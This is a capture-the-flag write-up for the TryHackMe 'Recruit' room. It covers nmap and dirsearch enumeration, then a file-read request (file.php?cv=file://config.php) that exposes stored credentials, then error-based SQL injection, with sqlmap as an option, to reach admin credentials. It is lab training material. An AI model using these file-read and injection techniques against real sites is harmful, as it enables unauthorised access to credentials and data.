---
title: "Tryhackme: Recruit Writeup"
description: "Infiltrate Recruit's new portal. Map the site, hunt for flaws, and gain unauthorised access."
date: 2026-04-26
image:
  path: /assets/icon.png
  alt: "Recruit"
author: vu1n
layout: post
categories: [Vulnerabilities]
tags: [Tryhackme, sqli, ctf]
---

Recruit is a medium-difficulty room involving a misconfigurations to gain user level flag. 
The path to root involves exploiting SQL injection to gain admin access.

## 1. Initial Enumeration

### Nmap Scan

Starting with a default script and version scanning to identify open services and ports:
```
# Nmap 7.98 scan initiated Sun Apr 26 19:50:50 2026 as: /usr/lib/nmap/nmap -sC -sV -oA recruit 10.49.132.72
Nmap scan report for 10.49.132.72
Host is up (0.19s latency).
Not shown: 997 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 56:ec:13:26:8d:a3:87:6b:c4:95:ee:d1:7f:64:c6:4f (RSA)
|   256 80:58:6a:5b:97:94:4f:c6:61:45:ce:91:df:53:c2:26 (ECDSA)
|_  256 12:ba:f2:2b:cb:49:f3:ba:9a:21:ad:d8:c2:b8:10:1f (ED25519)
53/tcp open  domain  ISC BIND 9.16.1 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.16.1-Ubuntu
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-title: Recruit
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Apr 26 19:51:07 2026 -- 1 IP address (1 host up) scanned in 17.31 seconds
```

So there are three ports open
1. ssh **(22)**
2. dns **(53)**
3. http **(80)**

Also provided with the recruit.thm hostname in the room, so we add it to our hosts file:
```
sudo sh -c 'echo "10.49.132.72  recruit.thm" >> /etc/hosts'
```
![Index page](https://raw.githubusercontent.com/0xvu1n/0xvu1n.github.io/refs/heads/main/index.png)

Visiting http://recruit.thm/, there is not much in source; we see login panel and access API hyperlink. Tried default creds, authentication bypass via SQLi, Bruteforcing with hydra but no luck.

So ran dirsearch against the website
```
┌──(root㉿DESKTOP-OS1A600)-[/home/vu1n/recruit]
└─# dirsearch -u http://10.49.132.72/ -o dirsearch
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: dirsearch

Target: http://10.49.132.72/

[19:58:10] Starting: 
[19:58:13] 403 -  277B  - /.ht_wsr.txt                                      
[19:58:13] 403 -  277B  - /.htaccess.bak1                                   
[19:58:13] 403 -  277B  - /.htaccess.orig                                   
[19:58:13] 403 -  277B  - /.htaccess.sample
[19:58:13] 403 -  277B  - /.htaccess.save
[19:58:13] 403 -  277B  - /.htm                                             
[19:58:13] 403 -  277B  - /.htaccess_orig
[19:58:13] 403 -  277B  - /.htaccessOLD2                                    
[19:58:13] 403 -  277B  - /.htaccessBAK                                     
[19:58:13] 403 -  277B  - /.htaccessOLD
[19:58:13] 403 -  277B  - /.htaccess_extra
[19:58:13] 403 -  277B  - /.htaccess_sc
[19:58:14] 403 -  277B  - /.html                                            
[19:58:14] 403 -  277B  - /.htpasswd_test                                   
[19:58:14] 403 -  277B  - /.httr-oauth                                      
[19:58:14] 403 -  277B  - /.htpasswds                                       
[19:58:16] 403 -  277B  - /.php                                             
[19:58:28] 200 - 1019B  - /api.php                                          
[19:58:29] 301 -  313B  - /assets  ->  http://10.49.132.72/assets/          
[19:58:29] 200 -  637B  - /assets/                                          
[19:58:35] 200 -    0B  - /config.php                                       
[19:58:36] 302 -  457B  - /dashboard.php  ->  index.php                     
[19:58:39] 200 -   20B  - /file.php                                         
[19:58:40] 200 -  210B  - /footer.php                                       
[19:58:41] 200 -  256B  - /header.php                                       
[19:58:44] 301 -  317B  - /javascript  ->  http://10.49.132.72/javascript/  
[19:58:47] 302 -    0B  - /logout.php  ->  index.php                        
[19:58:47] 301 -  311B  - /mail  ->  http://10.49.132.72/mail/              
[19:58:48] 200 -  455B  - /mail/                                            
[19:58:54] 301 -  317B  - /phpmyadmin  ->  http://10.49.132.72/phpmyadmin/  
[19:58:55] 200 -    3KB - /phpmyadmin/doc/html/index.html                   
[19:58:56] 200 -    3KB - /phpmyadmin/index.php                             
[19:58:56] 200 -    3KB - /phpmyadmin/
[19:59:00] 403 -  277B  - /server-status/                                   
[19:59:00] 403 -  277B  - /server-status                                    
[19:59:02] 200 -  471B  - /sitemap.xml                                      
                                                                             
Task Completed
```

And found some interesting endpoints like /mail , /file.php, /phpmyadmin, /api.php where the API documentation says
You can fetch a candidate CV using the following endpoint:  /file.php?cv=<URL>

Accessing the /mail/mail.log endpoint gives us the following messsage where we got the username **hr** of the login panel and 
it also says that **HR login credentials (username: hr) are currently stored in the application configuration file (config.php) for ease of access during the initial rollout phase..**

![Mail.log](https://raw.githubusercontent.com/0xvu1n/0xvu1n.github.io/refs/heads/main/assets/mail.png)

## 2. Exploitation

Earlier we got file.php?cv= endpoint so we can now access the config.php file with file protocol

```
http://10.48.177.252/file.php?cv=file://config.php
```
![config](https://raw.githubusercontent.com/0xvu1n/0xvu1n.github.io/refs/heads/main/assets/config.png)

After login it'll give you user level dashboard, and here the searchbox is vulnerable to error based SQL injection.
You can basic check the vulnerability by putting (') quote and it'll throw an error. we can use our regular query to fetch the tables and columns

![Injection](https://raw.githubusercontent.com/0xvu1n/0xvu1n.github.io/refs/heads/main/assets/inj.png)

You can also automate the process with SQLmap and it'll give you an admin dashboard password.

![Credentials](https://raw.githubusercontent.com/0xvu1n/0xvu1n.github.io/refs/heads/main/assets/creds.png)

Just after using the admin credentials. you'll get the admin flag.

![Rootflag](https://raw.githubusercontent.com/0xvu1n/0xvu1n.github.io/refs/heads/main/assets/root.png)
